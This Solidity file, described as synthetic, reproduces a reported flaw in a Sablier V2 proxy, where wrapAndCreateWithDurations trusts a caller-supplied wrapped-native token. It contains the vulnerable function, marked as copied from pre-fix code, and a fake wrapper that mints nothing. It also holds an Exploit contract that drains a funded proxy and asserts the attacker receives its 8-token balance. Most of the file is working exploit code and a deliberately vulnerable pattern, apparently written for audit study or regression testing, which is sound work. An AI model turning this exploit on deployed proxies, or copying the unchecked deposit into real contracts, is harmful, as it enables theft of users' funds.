// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Sablier V2 — wrapAndCreateWithDurations trusts a caller-chosen wrapped
    native (Cantina / Zach Obront, July 2023). SYNTHETIC, cheatcode-free.
    The deposit line is the pre-fix body, copied verbatim (@> VULN).

    Root cause: totalAmount is overwritten with msg.value, then
    asset.deposit{value: msg.value}() is called on whatever address the
    caller supplied. The credit is never checked. A wrapper that mints
    nothing still lets createWithDurations pull msg.value of that token
    from the proxy, so a pre-existing balance is sent to the recipient.
    Real WETH mints 1:1, so the same call spends only the ETH just wrapped. */

interface IWrappedNativeAsset {
    function deposit() external payable;
}

interface IERC20Mini {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract OddWrapper {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public minter;
    address public sweeper;
    uint256 public minted;
    uint256 public depositCount;

    function setMinter(address m) external {
        require(minter == address(0), "minter set");
        minter = m;
    }

    function setSweeper(address s) external {
        sweeper = s;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function deposit() external payable {
        depositCount += 1;
        // Mints nothing. The ETH is the caller's and is returned to the sweeper.
        uint256 credit = 0;
        minted = credit;
        (bool ok,) = sweeper.call{value: msg.value}("");
        require(ok, "eth sweep");
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract RealWETH {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Lockup {
    uint256 public streams;

    struct Params {
        address recipient;
        uint128 totalAmount;
        address asset;
    }

    function createWithDurations(Params calldata p) external returns (uint256 streamId) {
        require(IERC20Mini(p.asset).transferFrom(msg.sender, p.recipient, p.totalAmount), "pull");
        streams += 1;
        streamId = streams;
    }
}

contract ProxyTarget {
    address private immutable SELF;

    struct CreateWithDurations {
        address recipient;
        uint128 totalAmount;
        address asset;
    }

    error CallNotDelegateCall();

    constructor() {
        SELF = address(this);
    }

    function wrapAndCreateWithDurations(address lockupLinear, CreateWithDurations memory createParams)
        external
        payable
        returns (uint256 streamId)
    {
        if (address(this) == SELF) revert CallNotDelegateCall();
        createParams.totalAmount = uint128(msg.value);
        // Wrap the native asset payment in ERC-20 form.
        // @> VULN: caller-chosen wrapped native; the tokens actually credited are never checked against msg.value.
        IWrappedNativeAsset(createParams.asset).deposit{value: msg.value}();
        // Approve the Sablier contract to spend funds.
        _approve(lockupLinear, createParams.asset, createParams.totalAmount);
        // Create the stream.
        streamId = Lockup(lockupLinear).createWithDurations(
            Lockup.Params({recipient: createParams.recipient, totalAmount: createParams.totalAmount, asset: createParams.asset})
        );
    }

    function _approve(address spender, address asset, uint256 amount) internal {
        require(IERC20Mini(asset).approve(spender, amount), "approve");
    }
}

contract UserProxy {
    address public envoy;

    constructor(address _envoy) {
        envoy = _envoy;
    }

    function execute(address target, bytes calldata data) external payable returns (bytes memory response) {
        require(msg.sender == envoy, "not envoy");
        (bool ok, bytes memory ret) = target.delegatecall(data);
        if (!ok) {
            assembly {
                revert(add(ret, 32), mload(ret))
            }
        }
        return ret;
    }
}

contract Victim {
    OddWrapper public token;

    constructor(OddWrapper _token) {
        token = _token;
    }

    function fund(address proxy, uint256 amount) external {
        token.mint(address(this), amount);
        require(token.transfer(proxy, amount), "fund");
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 8 ether;

    OddWrapper public token; // nonce 1
    Lockup public lockup; // nonce 2
    ProxyTarget public target; // nonce 3
    UserProxy public proxy; // nonce 4
    Victim public victim; // nonce 5

    uint256 public proxyBefore;
    uint256 public proxyFunded;
    uint256 public attackerGot;
    uint256 public proxyAfter;
    uint256 public wrapperMinted;
    uint256 public streamId;

    constructor() {
        token = new OddWrapper();
        lockup = new Lockup();
        target = new ProxyTarget();
        proxy = new UserProxy(address(this));
        victim = new Victim(token);
        token.setMinter(address(victim));
    }

    function run() external payable {
        require(msg.value == AMOUNT, "value");
        proxyBefore = token.balanceOf(address(proxy));
        victim.fund(address(proxy), AMOUNT);
        proxyFunded = token.balanceOf(address(proxy));
        token.setSweeper(msg.sender);
        ProxyTarget.CreateWithDurations memory params = ProxyTarget.CreateWithDurations({
            recipient: msg.sender,
            totalAmount: 0,
            asset: address(token)
        });
        bytes memory data = abi.encodeCall(ProxyTarget.wrapAndCreateWithDurations, (address(lockup), params));
        bytes memory ret = proxy.execute{value: msg.value}(address(target), data);
        streamId = abi.decode(ret, (uint256));
        attackerGot = token.balanceOf(msg.sender);
        proxyAfter = token.balanceOf(address(proxy));
        wrapperMinted = token.minted();
        require(proxyBefore == 0, "proxy was not empty");
        require(proxyFunded == AMOUNT, "proxy was not funded with 8");
        require(wrapperMinted == 0, "wrapper minted tokens");
        require(attackerGot == AMOUNT, "attacker did not receive 8");
        require(proxyAfter == 0, "proxy still holds tokens");
        require(streamId == 1, "stream");
    }
}
